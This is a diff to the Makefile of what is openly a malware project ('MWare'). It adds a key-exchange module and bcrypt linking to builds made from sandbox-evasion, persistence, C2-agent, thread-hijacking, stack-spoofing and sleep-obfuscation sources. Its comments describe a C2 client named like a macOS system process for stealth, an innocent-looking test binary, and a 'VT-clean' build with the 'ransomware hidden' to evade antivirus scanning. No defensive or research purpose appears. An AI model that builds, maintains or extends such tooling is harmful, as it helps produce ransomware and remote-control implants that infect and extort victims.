@@ -27,11 +27,11 @@ WX_CXXFLAGS := $(shell $(WX_MINGW_CONFIG) --static --cxxflags 2>/dev/null)
 WX_LDFLAGS  := $(shell $(WX_MINGW_CONFIG) --static --libs all 2>/dev/null)
 
 CFLAGS    = -std=c++17 -O2 -s -Wall -Wextra -static -static-libgcc -static-libstdc++ $(WX_CXXFLAGS) -I MWare/
-LDFLAGS   = -lws2_32 -lpsapi -Wl,--strip-all $(WX_LDFLAGS)
+LDFLAGS   = -lws2_32 -lpsapi -lbcrypt -Wl,--strip-all $(WX_LDFLAGS)
 RES       = resource.res
 
 # Source files (modular build)
-SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/sandbox_evasion.cpp MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp MWare/gui.cpp MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
+SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/sandbox_evasion.cpp MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp MWare/gui.cpp MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
 TARGET  = MWare.exe
 
 # ============================================================================
@@ -48,7 +48,7 @@ $(TARGET): $(SRCS)
 MAC_CC      = clang++
 MAC_CFLAGS  = -std=c++17 -O2 -Wall -Wextra -DHEADLESS -DSILENT_MODE -I MWare/
 MAC_LDFLAGS = -lpthread
-MAC_SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/sandbox_evasion.cpp MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp MWare/gui.cpp MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
+MAC_SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/sandbox_evasion.cpp MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp MWare/gui.cpp MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
 MAC_TARGET  = MWare-bin
 
 mac: $(MAC_SRCS)
@@ -78,7 +78,7 @@ mac-gui: $(C2_CLIENT_TARGET)
 # ============================================================================
 # Binary named like a macOS system process for stealth
 C2_CLIENT_TARGET = UserEventAgent
-C2_CLIENT_SRCS = MWare/c2_client.cpp MWare/crypto.cpp MWare/persistence.cpp MWare/c2_agent.cpp \
+C2_CLIENT_SRCS = MWare/c2_client.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/persistence.cpp MWare/c2_agent.cpp \
                  MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp \
                  MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp MWare/evasion.cpp \
                  MWare/sandbox_evasion.cpp
@@ -92,7 +92,7 @@ $(C2_CLIENT_TARGET): $(C2_CLIENT_SRCS)
 # No TLS certificates required — zero-config startup.
 # ============================================================================
 RSW_TARGET = RSW
-RSW_SRC = RSW.cpp rsw_protocol.cpp MWare/crypto.cpp
+RSW_SRC = RSW.cpp rsw_protocol.cpp MWare/crypto.cpp MWare/keyexchange.cpp
 
 $(RSW_TARGET): $(RSW_SRC)
 	$(MAC_CC) -std=c++17 -O2 -Wall -Wextra -I MWare/ $(RSW_SRC) -o $(RSW_TARGET) -lpthread
@@ -131,13 +131,13 @@ debug: $(SRCS)
 # Smaller, faster to build, innocent-looking for sandbox testing.
 # If this works, the GUI version (MWare.exe) should also work — same core.
 TEST_TARGET  = sys_check.exe
-TEST_SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/sandbox_evasion.cpp \
+TEST_SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/sandbox_evasion.cpp \
                MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp \
                MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp \
                MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
 TEST_CFLAGS  = -std=c++17 -O2 -s -Wall -Wextra -static -static-libgcc -static-libstdc++ \
                -DHEADLESS -mconsole -I MWare/
-TEST_LDFLAGS = -lws2_32 -lpsapi -Wl,--strip-all
+TEST_LDFLAGS = -lws2_32 -lpsapi -lbcrypt -Wl,--strip-all
 
 test: $(TEST_SRCS)
 	@echo "[*] Building headless test binary (no GUI)..."
@@ -162,7 +162,7 @@ VT_TARGET  = sys_check.exe
 VT_SRCS    = $(TEST_SRCS)
 VT_CFLAGS  = -std=c++17 -O2 -s -Wall -Wextra -static -static-libgcc -static-libstdc++ \
              -DHEADLESS -DSILENT_MODE -DVT_CLEAN -ffunction-sections -fdata-sections -mwindows -I MWare/
-VT_LDFLAGS = -lws2_32 -lpsapi -Wl,--strip-all -Wl,--gc-sections
+VT_LDFLAGS = -lws2_32 -lpsapi -lbcrypt -Wl,--strip-all -Wl,--gc-sections
 
 vt: $(VT_SRCS)
 	@echo "[*] Building VT-clean headless binary (no GUI, silent, ransomware hidden)..."
